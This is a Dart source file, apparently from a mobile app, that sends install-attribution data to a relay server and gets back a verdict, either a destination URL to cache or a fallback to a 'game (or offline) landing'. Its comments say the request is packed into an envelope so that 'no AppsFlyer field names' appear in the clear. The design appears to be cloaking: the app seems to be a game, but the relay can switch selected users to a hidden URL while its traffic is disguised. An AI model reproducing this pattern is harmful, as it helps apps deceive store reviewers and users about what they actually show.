import 'dart:convert';

import '../config/relay_config.dart';
import '../core/landing.dart';
import 'beacon_keystore.dart';
import 'relay_agent.dart';
import 'veil_pack.dart';

// Turns the attribution body into a verdict. The body is packed into
// the wire envelope (see `veil_pack.dart`) before it leaves — no
// AppsFlyer field names in the clear, a fresh nonce each request. The
// relay unpacks it, forwards clean JSON upstream, and returns the answer
// verbatim.
//
// An approved response caches the URL and its expiry so a returning
// launch can skip the call while the URL is still fresh. Any failure —
// HTTP error, timeout, malformed JSON — becomes a rejected verdict,
// which the coordinator turns into a game (or offline) landing.

class VerdictCall {
  VerdictCall(this._keystore);

  final BeaconKeystore _keystore;

  Future<Verdict> ask(Map<String, dynamic> body) async {
    final String endpoint = RelayConfig.endpointUrl;
    if (endpoint.isEmpty) {
      return Verdict.rejected('endpoint_missing');
    }
    final String secret = RelayConfig.relaySecret;
    if (secret.isEmpty) {
      return Verdict.rejected('secret_missing');
    }

    try {
      final Map<String, dynamic> envelope = VeilPack.seal(body, secret);
      final dynamic response = await relayAgent
          .post(
            Uri.parse(endpoint),
            headers: const <String, String>{
              'Accept': 'application/json',
              'Content-Type': 'application/json',
            },
            body: jsonEncode(envelope),
          )
          .timeout(Duration(seconds: RelayConfig.verdictTimeoutSeconds));

      if (response.statusCode != 200) {
        return Verdict.rejected('http_${response.statusCode}');
      }

      final dynamic decoded = jsonDecode(response.body);
      if (decoded is! Map) return Verdict.rejected('malformed');
      final Verdict verdict = Verdict.fromJson(
        Map<String, dynamic>.from(decoded),
      );

      if (verdict.hasDestination) {
        await _keystore.cacheDestination(verdict.url!, verdict.expiresAt);
      }
      return verdict;
    } catch (e) {
      return Verdict.rejected('network:$e');
    }
  }
}
